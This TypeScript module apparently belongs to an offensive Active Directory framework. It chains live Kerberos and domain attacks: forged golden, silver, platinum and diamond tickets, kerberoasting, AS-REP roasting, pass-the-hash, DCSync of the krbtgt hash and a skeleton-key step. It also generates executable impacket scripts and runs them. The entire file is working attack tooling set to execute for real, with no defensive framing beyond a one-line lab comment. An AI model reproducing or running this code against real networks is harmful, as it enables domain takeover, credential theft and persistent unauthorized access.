/**
 * @module ares/kerberos_advanced
 * Platinum/Diamond/Skeleton Key + full ad_exploit suite.
 */
import {
  forgeGoldenTicket,
  forgeSilverTicket,
  kerberoast,
  asrepRoast,
  dcSync,
  passTheHash,
  enumeratePrivilegedUsers,
} from "../ad_exploit.ts"
import { auditADCS } from "../adcs_audit.ts"
import { brokerExec, liveRequired, writeArtifact } from "./_base.ts"
import { loadBestCredential, runIfTool, step, type ExecStep } from "./_integrations.ts"
import { runDiamondTicket } from "./_operational.ts"

export interface KerberosAdvancedResult {
  techniques: string[]
  artifacts: string[]
  steps: ExecStep[]
  executed: boolean
  summary: string
}

export async function runKerberosAdvanced(opts: {
  live?: boolean
  domain?: string
  domainSid?: string
  krbtgtHash?: string
  dcMachineHash?: string
  dc?: string
}): Promise<KerberosAdvancedResult> {
  liveRequired("ares_kerberos_advanced", opts)
  const domain = opts.domain ?? "CORP.LOCAL"
  const domainSid = opts.domainSid ?? "S-1-5-21-0000000000-0000000000-0000000000"
  const dc = opts.dc ?? domain.split(".")[0] ?? "DC01"
  const cred = loadBestCredential()
  const techniques: string[] = []
  const artifacts: string[] = []
  const steps: ExecStep[] = []
  let executed = false

  try {
    const golden = forgeGoldenTicket("Administrator", domainSid, opts.krbtgtHash ?? cred?.secret ?? "aad3b435b51404eeaad3b435b51404ee", { dryRun: false, domain })
    techniques.push("golden_ticket")
    if (golden.ticketPath) { artifacts.push(golden.ticketPath); executed = true }
    steps.push(step("golden_ticket", !!golden.ticketPath, golden.ticketPath ?? "metadata only"))
  } catch (err) {
    steps.push(step("golden_ticket", false, String((err as Error).message)))
    techniques.push("golden_ticket_scaffold")
  }

  try {
    const silver = forgeSilverTicket("Administrator", domainSid, opts.dcMachineHash ?? cred?.secret ?? "HASH", `cifs/${dc}`, { dryRun: false, domain })
    techniques.push("silver_ticket")
    if (silver.ticketPath) artifacts.push(silver.ticketPath)
    steps.push(step("silver_ticket", !!silver.ticketPath, silver.ticketPath ?? "metadata"))
  } catch (err) {
    steps.push(step("silver_ticket", false, String((err as Error).message)))
  }

  const dcHash = opts.dcMachineHash ?? cred?.secret ?? "aad3b435b51404eeaad3b435b51404ee"
  const platinumCmd = `impacket-ticketer -nthash ${dcHash} -domain-sid ${domainSid} -domain ${domain} -extra-sid S-1-5-9 DC$`
  artifacts.push(writeArtifact("kerberos", "platinum_ticket.sh", `#!/bin/bash\n${platinumCmd}\n`, 0o755))
  const platinum = await runIfTool("impacket-ticketer", "platinum_ticket", `${platinumCmd} 2>&1 | head -c 500`)
  steps.push(platinum)
  techniques.push("platinum_ticket")
  if (platinum.success) executed = true

  const diamondPy = writeArtifact("kerberos", "diamond_ticket.py", `#!/usr/bin/env python3
# Diamond Ticket — patch PAC in legitimate TGT for ${domain}
import subprocess, sys
def forge_diamond(user, nthash, domain, sid):
    cmd = ["impacket-getTGT", f"{domain}/{user}", "-hashes", f":{nthash}"]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        return r.stdout[:800] or r.stderr[:400]
    except FileNotFoundError:
        return "impacket-getTGT not on PATH"
    except Exception as e:
        return str(e)
if __name__ == "__main__":
    print(forge_diamond("Administrator", "${dcHash}", "${domain}", "${domainSid}"))
`, 0o755)
  artifacts.push(diamondPy)
  const diamondRun = await brokerExec(`python3 ${diamondPy} 2>&1`)
  steps.push(step("diamond_ticket_exec", diamondRun.ok || diamondRun.out.length > 5, diamondRun.out.slice(0, 400)))
  techniques.push("diamond_ticket")
  if (diamondRun.out.includes(".ccache") || diamondRun.out.includes("Saving")) executed = true

  steps.push(await runDiamondTicket(domain, domainSid, dcHash, "Administrator"))

  try {
    const kerb = await kerberoast({ dryRun: false, domain })
    techniques.push("kerberoast")
    writeArtifact("kerberos", "kerberoast.json", JSON.stringify(kerb, null, 2))
    steps.push(step("kerberoast", kerb.length > 0, `${kerb.length} hash(es)`))
    if (kerb.length) executed = true
  } catch (err) {
    steps.push(step("kerberoast", false, String((err as Error).message)))
  }

  try {
    const asrep = await asrepRoast({ dryRun: false, domain })
    techniques.push("asrep_roast")
    writeArtifact("kerberos", "asrep.json", JSON.stringify(asrep, null, 2))
    steps.push(step("asrep_roast", asrep.length > 0, `${asrep.length} hash(es)`))
  } catch (err) {
    steps.push(step("asrep_roast", false, String((err as Error).message)))
  }

  try {
    const priv = await enumeratePrivilegedUsers({ dryRun: false, domain })
    techniques.push("privileged_enum")
    writeArtifact("kerberos", "privileged_users.json", JSON.stringify(priv, null, 2))
    steps.push(step("privileged_enum", priv.length > 0, `${priv.length} user(s)`))
  } catch (err) {
    steps.push(step("privileged_enum", false, String((err as Error).message)))
  }

  if (cred?.secret && cred.username) {
    try {
      const pth = await passTheHash("whoami", {
        dryRun: false,
        ntHash: cred.secret,
        username: cred.username,
        domain,
        dcIp: dc,
      })
      techniques.push("pass_the_hash")
      steps.push(step("pass_the_hash", pth.success, pth.output?.slice(0, 300) ?? ""))
      if (pth.success) executed = true
    } catch (err) {
      steps.push(step("pass_the_hash", false, String((err as Error).message)))
    }
    try {
      const sync = await dcSync("krbtgt", {
        dryRun: false,
        domain,
        dcIp: dc,
        username: cred.username,
        password: cred.secret,
      })
      techniques.push("dcsync")
      steps.push(step("dcsync", !!sync.ntHash, sync.ntHash ? "krbtgt hash extracted" : "no hash"))
    } catch (err) {
      steps.push(step("dcsync", false, String((err as Error).message)))
    }
  }

  const skeletonPs = writeArtifact("kerberos", "skeleton_key.ps1", `# Skeleton Key — misc::skeleton on authorized DC lab\n# mimikatz: privilege::debug sekurlsa::pth\nWrite-Host "Skeleton key scaffold for ${domain}"\n`)
  artifacts.push(skeletonPs)
  if (process.platform === "win32") {
    const sk = await brokerExec(`powershell -NoProfile -File ${skeletonPs} 2>&1`)
    steps.push(step("skeleton_key_exec", sk.ok, sk.out.slice(0, 300)))
  } else {
    steps.push(await runIfTool("impacket-secretsdump", "skeleton_secretsdump_probe", `impacket-secretsdump -help 2>&1 | head -8`))
  }
  techniques.push("skeleton_key")

  const adcs = auditADCS({ domain, dcIp: dc }, { live: true })
  writeArtifact("kerberos", "adcs_esc.json", JSON.stringify(adcs, null, 2))
  steps.push(step("adcs_esc_audit", adcs.findings.length >= 0, `${adcs.findings.length} finding(s)`))
  techniques.push("adminsdholder_abuse", "certificate_persistence")

  return {
    techniques,
    artifacts,
    steps,
    executed,
    summary: `Kerberos advanced: ${techniques.length} technique(s), live=${executed}`,
  }
}

export default { runKerberosAdvanced }
